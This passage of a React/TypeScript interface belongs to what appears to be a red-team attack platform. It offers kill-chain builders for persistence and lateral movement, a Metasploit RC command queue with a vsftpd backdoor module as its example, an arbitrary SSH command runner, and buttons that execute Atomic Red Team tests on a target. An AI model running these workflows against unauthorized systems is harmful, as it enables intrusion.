                              })()).map((mod) => {
                                const isSelected = killChain.postExploitation.persistenceAttacks.some(a => a.module_path === mod.module)
                                return (
                                  <div
                                    key={mod.module}
                                    onClick={() => {
                                      const exploit: SuggestedExploit = {
                                        id: `persist-${mod.module}`,
                                        name: mod.name,
                                        module_path: mod.module,
                                        source: 'built-in',
                                        service: 'persistence',
                                        port: 0,
                                        product: 'Persistence',
                                        description: mod.name,
                                        rank: 'normal',
                                        payload: null,
                                        exploit_type: 'persistence',
                                        options: {},
                                        confidence: 'high'
                                      }
                                      if (isSelected) {
                                        setKillChain(prev => ({
                                          ...prev,
                                          postExploitation: {
                                            ...prev.postExploitation,
                                            persistenceAttacks: prev.postExploitation.persistenceAttacks.filter(a => a.module_path !== mod.module)
                                          }
                                        }))
                                      } else {
                                        setKillChain(prev => ({
                                          ...prev,
                                          postExploitation: {
                                            ...prev.postExploitation,
                                            persistenceAttacks: [...prev.postExploitation.persistenceAttacks, exploit]
                                          }
                                        }))
                                      }
                                    }}
                                    className={`p-2 rounded-lg border cursor-pointer transition-all ${
                                      isSelected
                                        ? 'border-neon-red bg-neon-red/10'
                                        : 'border-slate/20 bg-graphite/50 hover:border-slate/40'
                                    }`}
                                  >
                                    <span className="text-sm text-white">{mod.name}</span>
                                  </div>
                                )
                              })}
                            </div>
                          </div>
                        </>
                      )}
                    </div>

                    {/* Stage 4: Lateral Movement */}
                    <div className="bg-graphite/30 rounded-xl p-4 border border-neon-yellow/20">
                      <div className="flex items-center gap-2 mb-3">
                        <div className="w-8 h-8 rounded-full bg-neon-yellow/20 border border-neon-yellow/40 flex items-center justify-center text-neon-yellow font-bold text-sm">4</div>
                        <h3 className="font-display font-semibold text-white tracking-wider">LATERAL MOVEMENT</h3>
                        <span className="ml-auto text-xs text-slate">
                          {killChain.lateralMovement.selectedModules.length} module(s) selected
                        </span>
                      </div>
                      <p className="text-xs text-slate mb-3">Select lateral movement techniques</p>
                      <div className="space-y-2 max-h-[200px] overflow-y-auto">
                        {LATERAL_MOVEMENT_MODULES.map((mod) => {
                          const isSelected = killChain.lateralMovement.selectedModules.some(m => m.module === mod.module)
                          return (
                            <div
                              key={mod.module}
                              onClick={() => {
                                if (isSelected) {
                                  setKillChain(prev => ({
                                    ...prev,
                                    lateralMovement: {
                                      selectedModules: prev.lateralMovement.selectedModules.filter(m => m.module !== mod.module)
                                    }
                                  }))
                                } else {
                                  setKillChain(prev => ({
                                    ...prev,
                                    lateralMovement: {
                                      selectedModules: [...prev.lateralMovement.selectedModules, mod]
                                    }
                                  }))
                                }
                              }}
                              className={`p-2 rounded-lg border cursor-pointer transition-all ${
                                isSelected
                                  ? 'border-neon-yellow bg-neon-yellow/10'
                                  : 'border-slate/20 bg-graphite/50 hover:border-slate/40'
                              }`}
                            >
                              <div className="flex items-center gap-2">
                                <span className="text-sm text-white font-semibold">{mod.name}</span>
                                <span className="text-xs text-slate font-mono ml-auto">{mod.target}</span>
                              </div>
                            </div>
                          )
                        })}
                      </div>
                    </div>

                    {/* Terminal Output */}
                    {(killChainOutput || isKillChainRunning) && (
                      <div className="bg-void border border-slate/20 rounded-lg p-3">
                        <div className="flex items-center justify-between mb-2">
                          <span className="text-xs text-slate font-display tracking-wider flex items-center gap-1.5">
                            <CommandLineIcon className="w-3.5 h-3.5 text-cyber-cyan" />
                            KILL CHAIN EXECUTION OUTPUT
                          </span>
                          <button
                            onClick={() => {
                              setKillChainOutput('')
                              setIsKillChainRunning(false)
                            }}
                            className="px-2 py-0.5 rounded text-[10px] border border-slate/20 text-slate hover:text-white hover:border-slate/40 transition-colors flex items-center gap-1"
                            title="Clear output"
                          >
                            <TrashIcon className="w-3 h-3" />
                            CLEAR
                          </button>
                        </div>
                        <div
                          ref={killChainTerminalRef}
                          className="bg-void border border-slate/20 rounded-lg p-3 font-mono text-xs text-neon-green h-[300px] overflow-y-auto whitespace-pre-wrap"
                        >
                          {killChainOutput || (
                            <span className="text-slate/50"># Kill chain execution output will appear here...</span>
                          )}
                          {isKillChainRunning && (
                            <span className="text-cyber-cyan animate-pulse">‚è≥ Executing kill chain...</span>
                          )}
                        </div>
                      </div>
                    )}

                    {/* Save Button */}
                    <div className="pt-4 border-t border-slate/20">
                      <motion.button
                        onClick={() => setShowSaveDialog(true)}
                        disabled={killChain.enumeration.selectedHosts.length === 0 || killChain.weaponization.selectedAttacks.length === 0}
                        className={`w-full px-4 py-3 rounded-xl font-display font-bold text-sm tracking-wider flex items-center justify-center gap-2 transition-all ${
                          killChain.enumeration.selectedHosts.length === 0 || killChain.weaponization.selectedAttacks.length === 0
                            ? 'bg-graphite/50 border border-slate/30 text-slate cursor-not-allowed'
                            : 'bg-gradient-to-r from-cyber-purple/20 to-cyber-magenta/20 border border-cyber-purple/30 text-cyber-purple hover:shadow-[0_0_20px_rgba(168,85,247,0.2)]'
                        }`}
                        whileHover={killChain.enumeration.selectedHosts.length > 0 && killChain.weaponization.selectedAttacks.length > 0 ? { scale: 1.02 } : {}}
                        whileTap={killChain.enumeration.selectedHosts.length > 0 && killChain.weaponization.selectedAttacks.length > 0 ? { scale: 0.98 } : {}}
                      >
                        <DocumentTextIcon className="w-5 h-5" />
                        SAVE AS ATTACK VECTOR
                      </motion.button>
                    </div>

                    {/* Save Dialog */}
                    <AnimatePresence>
                      {showSaveDialog && (
                        <motion.div
                          initial={{ opacity: 0 }}
                          animate={{ opacity: 1 }}
                          exit={{ opacity: 0 }}
                          className="fixed inset-0 bg-void/80 backdrop-blur-sm z-50 flex items-center justify-center"
                          onClick={() => setShowSaveDialog(false)}
                        >
                          <motion.div
                            initial={{ scale: 0.9, opacity: 0 }}
                            animate={{ scale: 1, opacity: 1 }}
                            exit={{ scale: 0.9, opacity: 0 }}
                            onClick={(e) => e.stopPropagation()}
                            className="bg-graphite border border-slate/30 rounded-2xl p-6 max-w-md w-full mx-4"
                          >
                            <h3 className="font-display font-bold text-white mb-4">Save Attack Vector</h3>
                            <input
                              type="text"
                              value={attackVectorName}
                              onChange={(e) => setAttackVectorName(e.target.value)}
                              placeholder="Enter attack vector name..."
                              className="cyber-input mb-4"
                              autoFocus
                            />
                            <div className="flex gap-3">
                              <button
                                onClick={() => {
                                  if (!attackVectorName.trim()) {
                                    toast.error('Please enter a name')
                                    return
                                  }
                                  const vector: AttackVector = {
                                    id: `vector_${Date.now()}`,
                                    name: attackVectorName.trim(),
                                    timestamp: new Date().toISOString(),
                                    killChain,
                                    status: 'draft',
                                  }
                                  addAttackVector(vector)
                                  setAttackVectorName('')
                                  setShowSaveDialog(false)
                                  toast.success('Attack vector saved')
                                }}
                                className="flex-1 cyber-btn-success"
                              >
                                SAVE
                              </button>
                              <button
                                onClick={() => {
                                  setShowSaveDialog(false)
                                  setAttackVectorName('')
                                }}
                                className="px-4 py-2 rounded-xl border border-slate/30 text-slate hover:text-white hover:border-slate/50"
                              >
                                CANCEL
                              </button>
                            </div>
                          </motion.div>
                        </motion.div>
                      )}
                    </AnimatePresence>
                  </div>
                )}

                {/* ‚îÄ‚îÄ TAB: Suggested Attacks ‚îÄ‚îÄ */}
                {attackTab === 'suggested' && (
                  <div>
                    {suggestedExploits.length === 0 ? (
                      <div className="text-center py-8 text-slate">
                        <MagnifyingGlassIcon className="w-10 h-10 mx-auto mb-2 opacity-40" />
                        <p className="text-sm">No exploit suggestions yet.</p>
                        <p className="text-xs text-slate/60 mt-1">Run Network Discovery and select a target to see smart attack suggestions.</p>
                      </div>
                    ) : (
                      <div className="space-y-2 max-h-[400px] overflow-y-auto pr-1">
                        {suggestedExploits.map((exploit) => (
                          <div
                            key={exploit.id}
                            onClick={() => setSelectedExploit(selectedExploit?.id === exploit.id ? null : exploit)}
                            className={`
                              p-3 rounded-xl border cursor-pointer transition-all duration-200
                              ${selectedExploit?.id === exploit.id
                                ? 'border-cyber-purple bg-cyber-purple/10 shadow-[0_0_20px_rgba(168,85,247,0.15)]'
                                : 'border-slate/20 bg-graphite/30 hover:border-slate/40'
                              }
                            `}
                          >
                            <div className="flex items-center gap-2 mb-1">
                              <span className={`inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded text-[9px] font-mono font-bold uppercase border ${getConfidenceBadge(exploit.confidence)}`}>
                                {exploit.confidence}
                              </span>
                              <span className={`inline-flex items-center px-1.5 py-0.5 rounded text-[9px] font-mono border ${getSourceBadge(exploit.source)}`}>
                                {exploit.source}
                              </span>
                              <span className="text-[10px] font-mono text-cyber-cyan">
                                :{exploit.port} / {exploit.service}
                              </span>
                              {exploit.rank && exploit.rank !== 'unknown' && (
                                <span className="text-[10px] font-mono text-slate ml-auto">
                                  rank: {exploit.rank}
                                </span>
                              )}
                            </div>
                            <p className="text-sm text-white font-semibold truncate">{exploit.name}</p>
                            {exploit.module_path && (
                              <p className="text-[10px] font-mono text-slate mt-0.5 truncate">{exploit.module_path}</p>
                            )}

                            {/* Actions when selected */}
                            {selectedExploit?.id === exploit.id && exploit.source === 'built-in' && (
                              <div className="mt-2 pt-2 border-t border-slate/10 flex gap-2">
                                <button
                                  onClick={(e) => {
                                    e.stopPropagation()
                                    loadExploitToMsf(exploit)
                                  }}
                                  className="px-3 py-1 rounded-lg bg-neon-red/10 border border-neon-red/30 text-neon-red text-[10px] font-display font-bold tracking-wider hover:bg-neon-red/20 transition-colors flex items-center gap-1"
                                >
                                  <AdjustmentsHorizontalIcon className="w-3 h-3" />
                                  LOAD INTO MSF CONSOLE
                                </button>
                              </div>
                            )}
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                )}

                {/* ‚îÄ‚îÄ TAB: Custom Command ‚îÄ‚îÄ */}
                {attackTab === 'custom' && (
                  <div>
                    <p className="text-xs text-slate mb-3">
                      Execute any shell command on the agent machine via SSH. Useful for manual enumeration, custom scripts, or one-off commands.
                    </p>

                    {/* Terminal Output */}
                    <div
                      ref={terminalRef}
                      className="bg-void border border-slate/20 rounded-lg p-3 font-mono text-xs text-neon-green h-[250px] overflow-y-auto mb-3 whitespace-pre-wrap"
                    >
                      {cmdOutput || (
                        <span className="text-slate/50">
                          {'# Terminal output will appear here\n# Type a command below and press Enter or click Execute\n'}
                        </span>
                      )}
                      {isCmdRunning && (
                        <span className="text-cyber-cyan animate-pulse">‚è≥ Executing...</span>
                      )}
                    </div>

                    {/* Command Input */}
                    <div className="flex gap-2">
                      <div className="flex-1 relative">
                        <span className="absolute left-3 top-1/2 -translate-y-1/2 text-cyber-cyan font-mono text-sm">$</span>
                        <input
                          type="text"
                          value={customCmd}
                          onChange={(e) => setCustomCmd(e.target.value)}
                          onKeyDown={(e) => { if (e.key === 'Enter' && !isCmdRunning) executeCustomCommand() }}
                          placeholder="nmap -sC -sV 192.168.1.100 ..."
                          className="cyber-input pl-7 font-mono text-sm"
                          disabled={isCmdRunning}
                        />
                      </div>
                      <motion.button
                        onClick={executeCustomCommand}
                        disabled={isCmdRunning || !customCmd.trim()}
                        className={`px-4 py-2 rounded-xl font-display font-bold text-sm tracking-wider flex items-center gap-1.5 transition-all
                          ${isCmdRunning
                            ? 'bg-graphite/50 border border-slate/30 text-slate'
                            : 'bg-cyber-cyan/20 border border-cyber-cyan/30 text-cyber-cyan hover:bg-cyber-cyan/30'
                          }
                        `}
                        whileHover={!isCmdRunning ? { scale: 1.03 } : {}}
                        whileTap={!isCmdRunning ? { scale: 0.97 } : {}}
                      >
                        {isCmdRunning ? (
                          <ArrowPathIcon className="w-4 h-4 animate-spin" />
                        ) : (
                          <PaperAirplaneIcon className="w-4 h-4" />
                        )}
                        EXEC
                      </motion.button>
                      <button
                        onClick={() => setCmdOutput('')}
                        className="px-3 py-2 rounded-xl border border-slate/20 text-slate hover:text-white hover:border-slate/40 transition-colors"
                        title="Clear terminal"
                      >
                        <TrashIcon className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                )}

                {/* ‚îÄ‚îÄ TAB: Manual Metasploit ‚îÄ‚îÄ */}
                {attackTab === 'metasploit' && (
                  <div>
                    <p className="text-xs text-slate mb-3">
                      Build Metasploit RC commands step-by-step. Commands are queued and executed as a batch via <code className="text-cyber-cyan">msfconsole -r</code> on the agent.
                    </p>

                    {/* Command Builder */}
                    <div className="mb-3">
                      <div className="flex gap-2 mb-2">
                        <div className="flex-1 relative">
                          <span className="absolute left-3 top-1/2 -translate-y-1/2 text-neon-red font-mono text-[10px]">msf&gt;</span>
                          <input
                            type="text"
                            value={msfNewCmd}
                            onChange={(e) => setMsfNewCmd(e.target.value)}
                            onKeyDown={(e) => {
                              if (e.key === 'Enter' && msfNewCmd.trim()) {
                                setMsfCommands(prev => [...prev, msfNewCmd.trim()])
                                setMsfNewCmd('')
                              }
                            }}
                            placeholder="use exploit/unix/ftp/vsftpd_234_backdoor"
                            className="cyber-input pl-10 font-mono text-sm"
                          />
                        </div>
                        <button
                          onClick={() => {
                            if (msfNewCmd.trim()) {
                              setMsfCommands(prev => [...prev, msfNewCmd.trim()])
                              setMsfNewCmd('')
                            }
                          }}
                          className="px-3 py-2 rounded-xl bg-neon-red/10 border border-neon-red/30 text-neon-red hover:bg-neon-red/20 transition-colors"
                          title="Add command"
                        >
                          <PlusIcon className="w-4 h-4" />
                        </button>
                      </div>

                      {/* Command Queue */}
                      {msfCommands.length > 0 && (
                        <div className="bg-void border border-slate/20 rounded-lg p-3 max-h-[180px] overflow-y-auto mb-2">
                          <p className="text-[10px] font-display tracking-wider text-slate uppercase mb-2">
                            RC FILE PREVIEW ({msfCommands.length} commands)
                          </p>
                          {msfCommands.map((cmd, idx) => (
                            <div key={idx} className="flex items-center gap-2 text-xs font-mono group">
                              <span className="text-slate/50 w-5 text-right">{idx + 1}.</span>
                              <span className="text-neon-green flex-1">{cmd}</span>
                              <button
                                onClick={() => setMsfCommands(prev => prev.filter((_, i) => i !== idx))}
                                className="opacity-0 group-hover:opacity-100 text-neon-red/50 hover:text-neon-red transition-all"
                              >
                                <StopIcon className="w-3 h-3" />
                              </button>
                            </div>
                          ))}
                        </div>
                      )}

                      {/* Execute / Clear */}
                      <div className="flex gap-2">
                        <motion.button
                          onClick={executeMsfCommands}
                          disabled={isMsfRunning || msfCommands.length === 0}
                          className={`flex-1 px-4 py-2.5 rounded-xl font-display font-bold text-sm tracking-wider flex items-center justify-center gap-2 transition-all
                            ${isMsfRunning
                              ? 'bg-graphite/50 border border-slate/30 text-slate'
                              : 'bg-gradient-to-r from-neon-red/20 to-cyber-magenta/20 border border-neon-red/30 text-neon-red hover:shadow-[0_0_20px_rgba(255,50,50,0.2)]'
                            }
                          `}
                          whileHover={!isMsfRunning ? { scale: 1.02 } : {}}
                          whileTap={!isMsfRunning ? { scale: 0.98 } : {}}
                        >
                          {isMsfRunning ? (
                            <><ArrowPathIcon className="w-4 h-4 animate-spin" /> EXECUTING...</>
                          ) : (
                            <><PlayIcon className="w-4 h-4" /> EXECUTE MSF ({msfCommands.length})</>
                          )}
                        </motion.button>
                        <button
                          onClick={() => setMsfCommands([])}
                          className="px-3 py-2 rounded-xl border border-slate/20 text-slate hover:text-white hover:border-slate/40 transition-colors"
                          title="Clear all commands"
                        >
                          <TrashIcon className="w-4 h-4" />
                        </button>
                      </div>
                    </div>

                    {/* MSF Output */}
                    <div
                      ref={msfTerminalRef}
                      className="bg-void border border-slate/20 rounded-lg p-3 font-mono text-xs text-neon-green h-[200px] overflow-y-auto whitespace-pre-wrap"
                    >
                      {msfOutput || (
                        <span className="text-slate/50">
                          {'# Metasploit output will appear here\n# Build your RC commands above and click Execute\n'}
                        </span>
                      )}
                      {isMsfRunning && (
                        <span className="text-neon-red animate-pulse">‚è≥ msfconsole running...</span>
                      )}
                    </div>

                    {/* Clear output */}
                    <div className="flex justify-end mt-2">
                      <button
                        onClick={() => setMsfOutput('')}
                        className="text-xs text-slate hover:text-white transition-colors flex items-center gap-1"
                      >
                        <TrashIcon className="w-3 h-3" /> Clear output
                      </button>
                    </div>
                  </div>
                )}
              </>
            ) : (
              /* Credentialed mode: Dynamic Atomic Red Team Technique Selector */
              <div className="space-y-4">
                {/* Search + Platform Filter Bar */}
                <div className="flex gap-3">
                  <div className="flex-1 relative">
                    <MagnifyingGlassIcon className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate" />
                    <input
                      type="text"
                      value={artSearch}
                      onChange={(e) => setArtSearch(e.target.value)}
                      placeholder="Search technique ID (T1059) or name (PowerShell, credential, discovery...)"
                      className="cyber-input pl-9 text-sm"
                    />
                    {artSearch && (
                      <button onClick={() => setArtSearch('')} className="absolute right-3 top-1/2 -translate-y-1/2 text-slate hover:text-white">
                        <XMarkIcon className="w-4 h-4" />
                      </button>
                    )}
                  </div>
                  <div className="flex gap-1 p-1 bg-graphite/50 rounded-lg border border-slate/20">
                    {PLATFORM_FILTERS.map((pf) => (
                      <button
                        key={pf.value}
                        onClick={() => setArtPlatformFilter(pf.value)}
                        className={`px-2.5 py-1.5 rounded-md text-[10px] font-display font-bold tracking-wider transition-all flex items-center gap-1 ${
                          artPlatformFilter === pf.value
                            ? 'bg-neon-green/20 text-neon-green border border-neon-green/30'
                            : 'text-slate hover:text-white'
                        }`}
                      >
                        <span>{pf.icon}</span>
                        {pf.label}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Techniques Count Bar */}
                <div className="flex items-center justify-between text-xs text-slate px-1">
                  <span className="flex items-center gap-1.5">
                    <BeakerIcon className="w-3.5 h-3.5 text-neon-green" />
                    <span className="font-mono">{artTechniques.length}</span> techniques available
                    {artSearch && <span className="text-cyber-purple">‚Ä¢ filtered by &quot;{artSearch}&quot;</span>}
                  </span>
                  {artSelectedTechnique && (
                    <span className="text-neon-green font-mono">
                      Selected: {artSelectedTechnique.technique_id}
                    </span>
                  )}
                </div>

                {/* Loading State */}
                {artLoading && (
                  <div className="flex items-center justify-center py-6 gap-2 text-cyber-purple">
                    <ArrowPathIcon className="w-5 h-5 animate-spin" />
                    <span className="text-sm font-display tracking-wider">Loading techniques...</span>
                  </div>
                )}

                {/* Techniques List */}
                {!artLoading && (
                  <div className="max-h-[320px] overflow-y-auto pr-1 space-y-2 custom-scrollbar">
                    {artTechniques.length === 0 ? (
                      <div className="text-center py-8 text-slate">
                        <BeakerIcon className="w-10 h-10 mx-auto mb-2 opacity-40" />
                        <p className="text-sm">No techniques found</p>
                        <p className="text-xs text-slate/60 mt-1">Try a different search term or platform filter</p>
                      </div>
                    ) : (
                      artTechniques.map((tech) => (
                        <div key={tech.technique_id}>
                          <button
                            onClick={() => handleSelectTechnique(tech)}
                            className={`
                              w-full p-3 rounded-xl border text-left transition-all duration-200
                              ${artSelectedTechnique?.technique_id === tech.technique_id
                                ? 'border-neon-green bg-neon-green/5 shadow-[0_0_20px_rgba(34,197,94,0.15)]'
                                : 'border-slate/20 bg-graphite/30 hover:border-slate/40 hover:bg-graphite/50'
                              }
                            `}
                          >
                            <div className="flex items-center gap-3">
                              <div className="flex-shrink-0">
                                <span className={`inline-flex items-center px-2 py-1 rounded-lg text-xs font-mono font-bold tracking-wider ${
                                  artSelectedTechnique?.technique_id === tech.technique_id
                                    ? 'bg-neon-green/20 text-neon-green border border-neon-green/30'
                                    : 'bg-cyber-purple/15 text-cyber-purple border border-cyber-purple/25'
                                }`}>
                                  {tech.technique_id}
                                </span>
                              </div>
                              <div className="flex-1 min-w-0">
                                <p className="text-sm text-white font-semibold truncate">{tech.display_name}</p>
                                <div className="flex items-center gap-2 mt-1">
                                  <span className="text-[10px] font-mono text-slate">
                                    {tech.test_count} test{tech.test_count !== 1 ? 's' : ''}
                                  </span>
                                  <div className="flex gap-1">
                                    {tech.platforms.map(p => (
                                      <span key={p} className="text-[9px] px-1.5 py-0.5 rounded bg-graphite border border-slate/20 text-slate uppercase font-mono">
                                        {p === 'linux' ? 'üêß' : p === 'windows' ? 'ü™ü' : p === 'macos' ? 'üçé' : 'üíª'} {p}
                                      </span>
                                    ))}
                                  </div>
                                </div>
                              </div>
                              <div>
                                {artSelectedTechnique?.technique_id === tech.technique_id ? (
                                  <ChevronUpIcon className="w-4 h-4 text-neon-green" />
                                ) : (
                                  <ChevronDownIcon className="w-4 h-4 text-slate" />
                                )}
                              </div>
                            </div>
                          </button>

                          {/* Expanded: Atomic Tests for this technique */}
                          <AnimatePresence>
                            {artSelectedTechnique?.technique_id === tech.technique_id && artTechniqueDetail && (
                              <motion.div
                                initial={{ height: 0, opacity: 0 }}
                                animate={{ height: 'auto', opacity: 1 }}
                                exit={{ height: 0, opacity: 0 }}
                                transition={{ duration: 0.25 }}
                                className="overflow-hidden"
                              >
                                <div className="mt-2 ml-4 border-l-2 border-neon-green/30 pl-4 space-y-2">
                                  {artTechniqueDetail.tests.map((test) => {
                                    // Filter by platform if a filter is active
                                    if (artPlatformFilter && !test.platforms.includes(artPlatformFilter)) return null
                                    const isSelected = artSelectedTest?.guid === test.guid

                                    return (
                                      <div key={test.guid}>
                                        <button
                                          onClick={() => handleSelectTest(test)}
                                          className={`
                                            w-full p-3 rounded-lg border text-left transition-all duration-200
                                            ${isSelected
                                              ? 'border-cyber-cyan bg-cyber-cyan/5 shadow-[0_0_15px_rgba(34,211,238,0.1)]'
                                              : 'border-slate/15 bg-void/50 hover:border-slate/30'
                                            }
                                          `}
                                        >
                                          <div className="flex items-start gap-2">
                                            <span className={`flex-shrink-0 mt-0.5 w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-mono font-bold ${
                                              isSelected
                                                ? 'bg-cyber-cyan/20 text-cyber-cyan border border-cyber-cyan/30'
                                                : 'bg-graphite text-slate border border-slate/20'
                                            }`}>
                                              {test.index}
                                            </span>
                                            <div className="flex-1 min-w-0">
                                              <p className={`text-sm font-semibold ${isSelected ? 'text-cyber-cyan' : 'text-white/90'}`}>
                                                {test.name}
                                              </p>
                                              <p className="text-[11px] text-slate mt-0.5 line-clamp-2">{test.description}</p>
                                              <div className="flex items-center gap-2 mt-1.5 flex-wrap">
                                                <span className="text-[9px] px-1.5 py-0.5 rounded bg-graphite border border-slate/20 text-slate font-mono uppercase">
                                                  {test.executor_type}
                                                </span>
                                                {test.elevation_required && (
                                                  <span className="text-[9px] px-1.5 py-0.5 rounded bg-neon-red/10 border border-neon-red/20 text-neon-red font-mono uppercase">
                                                    ‚¨Ü ELEVATION
                                                  </span>
                                                )}
                                                {test.platforms.map(p => (
                                                  <span key={p} className="text-[9px] px-1.5 py-0.5 rounded bg-graphite/50 border border-slate/15 text-slate/70 font-mono">
                                                    {p}
                                                  </span>
                                                ))}
                                              </div>
                                            </div>
                                          </div>
                                        </button>

                                        {/* Command Preview when test selected */}
                                        <AnimatePresence>
                                          {isSelected && (
                                            <motion.div
                                              initial={{ height: 0, opacity: 0 }}
                                              animate={{ height: 'auto', opacity: 1 }}
                                              exit={{ height: 0, opacity: 0 }}
                                              transition={{ duration: 0.2 }}
                                              className="overflow-hidden"
                                            >
                                              <div className="mt-2 p-3 bg-void rounded-lg border border-slate/15">
                                                {/* Input Arguments */}
                                                {Object.keys(test.input_arguments).length > 0 && (
                                                  <div className="mb-3">
                                                    <p className="text-[10px] font-display tracking-wider text-neon-yellow uppercase mb-1.5 flex items-center gap-1">
                                                      <AdjustmentsHorizontalIcon className="w-3 h-3" />
                                                      INPUT ARGUMENTS (using defaults)
                                                    </p>
                                                    <div className="space-y-1">
                                                      {Object.entries(test.input_arguments).map(([key, arg]) => (
                                                        <div key={key} className="flex items-center gap-2 text-[10px] font-mono">
                                                          <span className="text-cyber-cyan">{key}</span>
                                                          <span className="text-slate/40">=</span>
                                                          <span className="text-neon-green truncate">{String(arg.default)}</span>
                                                          <span className="text-slate/30 truncate ml-auto">({arg.description})</span>
                                                        </div>
                                                      ))}
                                                    </div>
                                                  </div>
                                                )}

                                                {/* Command Preview */}
                                                <p className="text-[10px] font-display tracking-wider text-cyber-cyan uppercase mb-1.5 flex items-center gap-1">
                                                  <CodeBracketIcon className="w-3 h-3" />
                                                  ATTACK COMMAND
                                                </p>
                                                <pre className="text-[11px] font-mono text-neon-green bg-graphite/50 rounded p-2 overflow-x-auto whitespace-pre-wrap max-h-[120px] overflow-y-auto border border-slate/10">
                                                  {test.command || '(no command ‚Äî manual steps required)'}
                                                </pre>

                                                {test.cleanup_command && (
                                                  <div className="mt-2">
                                                    <button
                                                      onClick={() => setArtShowCleanup(!artShowCleanup)}
                                                      className="text-[10px] font-display tracking-wider text-slate hover:text-white transition-colors flex items-center gap-1"
                                                    >
                                                      <TrashIcon className="w-3 h-3" />
                                                      {artShowCleanup ? 'HIDE' : 'SHOW'} CLEANUP COMMAND
                                                    </button>
                                                    <AnimatePresence>
                                                      {artShowCleanup && (
                                                        <motion.pre
                                                          initial={{ height: 0, opacity: 0 }}
                                                          animate={{ height: 'auto', opacity: 1 }}
                                                          exit={{ height: 0, opacity: 0 }}
                                                          className="text-[11px] font-mono text-neon-yellow/70 bg-graphite/50 rounded p-2 overflow-x-auto whitespace-pre-wrap mt-1 border border-slate/10"
                                                        >
                                                          {test.cleanup_command}
                                                        </motion.pre>
                                                      )}
                                                    </AnimatePresence>
                                                  </div>
                                                )}

                                                {/* Execute Buttons */}
                                                <div className="flex gap-2 mt-3">
                                                  <motion.button
                                                    onClick={() => executeArtTest(false)}
                                                    disabled={artIsRunning || !test.command}
                                                    className={`flex-1 px-4 py-2 rounded-lg font-display font-bold text-xs tracking-wider flex items-center justify-center gap-1.5 transition-all ${
                                                      artIsRunning
                                                        ? 'bg-graphite/50 border border-slate/30 text-slate cursor-wait'
                                                        : 'bg-gradient-to-r from-neon-green/20 to-cyber-teal/20 border border-neon-green/30 text-neon-green hover:shadow-[0_0_20px_rgba(34,197,94,0.2)]'
                                                    }`}
                                                    whileHover={!artIsRunning ? { scale: 1.02 } : {}}
                                                    whileTap={!artIsRunning ? { scale: 0.98 } : {}}
                                                  >
                                                    {artIsRunning ? (
                                                      <><ArrowPathIcon className="w-3.5 h-3.5 animate-spin" /> RUNNING...</>
                                                    ) : (
                                                      <><PlayIcon className="w-3.5 h-3.5" /> EXECUTE ON TARGET</>
                                                    )}
                                                  </motion.button>
                                                  {test.cleanup_command && (
                                                    <motion.button
                                                      onClick={() => executeArtTest(true)}
                                                      disabled={artIsRunning}
                                                      className="px-3 py-2 rounded-lg border border-neon-yellow/20 text-neon-yellow/70 text-[10px] font-display font-bold tracking-wider hover:bg-neon-yellow/5 transition-all flex items-center gap-1"
                                                      whileHover={{ scale: 1.02 }}
                                                      whileTap={{ scale: 0.98 }}
                                                    >
                                                      <TrashIcon className="w-3 h-3" /> CLEANUP
                                                    </motion.button>
                                                  )}
                                                </div>
                                              </div>
                                            </motion.div>
                                          )}
                                        </AnimatePresence>
                                      </div>
                                    )
                                  })}
                                </div>
                              </motion.div>
                            )}
                          </AnimatePresence>
                        </div>
                      ))
                    )}
                  </div>
                )}

                {/* ‚îÄ‚îÄ ART Execution Console (persisted in store) ‚îÄ‚îÄ */}
                <div className="mt-4">
                  <div className="flex items-center justify-between mb-2">
                    <p className="text-xs font-display tracking-wider text-slate flex items-center gap-1.5">
                      <CommandLineIcon className="w-3.5 h-3.5 text-neon-green" />
                      ATOMIC RED TEAM ‚Äî EXECUTION CONSOLE
                      {artConsoleOutput && (
                        <span className="text-[9px] text-neon-green/50 font-mono ml-1">(persistent)</span>
                      )}
                    </p>
                    <button
                      onClick={() => setArtConsoleOutput('')}
                      className="text-[10px] text-slate hover:text-white transition-colors flex items-center gap-1"
                    >
                      <TrashIcon className="w-3 h-3" /> Clear
                    </button>
                  </div>
                  <div
                    ref={artConsoleRef}
                    className="bg-void border border-slate/20 rounded-lg p-3 font-mono text-xs text-neon-green h-[250px] overflow-y-auto whitespace-pre-wrap"
                  >
                    {artConsoleOutput || (
                      <span className="text-slate/50">
                        {'# Atomic Red Team execution output will appear here\n'}
                        {'# 1. Search and select a MITRE ATT&CK technique above\n'}
                        {'# 2. Pick a specific atomic test\n'}
                        {'# 3. Review the command and click "Execute on Target"\n'}
                        {'# Results will stream here in real-time\n'}
                      </span>
                    )}
                    {artIsRunning && (
                      <span className="text-cyber-cyan animate-pulse">‚è≥ Executing atomic test on target...</span>
                    )}
                  </div>
                </div>
              </div>
            )}
          </motion.div>

          {/* Execute Button ‚Äî Only shown for blackbox mode (credentialed uses inline ART execution) */}
          {mode === 'blackbox' && (
            <motion.button
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
              onClick={executeAttack}
              disabled={isLoading || isKillChainRunning || (attackTab === 'killchain' && (killChain.enumeration.selectedHosts.length === 0 || killChain.weaponization.selectedAttacks.length === 0))}
              className={`w-full py-4 rounded-xl font-display font-bold text-lg tracking-widest flex items-center justify-center gap-3 transition-all duration-300 bg-gradient-to-r from-cyber-purple to-cyber-magenta hover:shadow-[0_0_40px_rgba(168,85,247,0.4)] text-white border border-white/20 ${
                (isLoading || isKillChainRunning) ? 'opacity-50 cursor-not-allowed' : ''
              }`}
              whileHover={!isLoading && !isKillChainRunning ? { scale: 1.02 } : {}}
              whileTap={!isLoading && !isKillChainRunning ? { scale: 0.98 } : {}}
            >
              {isKillChainRunning ? (
                <>
                  <ArrowPathIcon className="w-6 h-6 animate-spin" />
                  EXECUTING KILL CHAIN...
                </>
              ) : attackTab === 'killchain' ? (
                <>
                  <BoltIcon className="w-6 h-6" />
                  EXECUTE KILL CHAIN
                </>
              ) : (
                <>
                  <PlayIcon className="w-6 h-6" />
                  EXECUTE ATTACK
                </>
              )}
            </motion.button>
          )}
        </div>

        {/* Attack Vectors */}
        <motion.div
          initial={{ opacity: 0, x: 20 }}
          animate={{ opacity: 1, x: 0 }}
          className="cyber-card rounded-2xl p-6"
        >
          <h2 className="font-display text-lg font-semibold tracking-wider text-white mb-4 flex items-center gap-2">
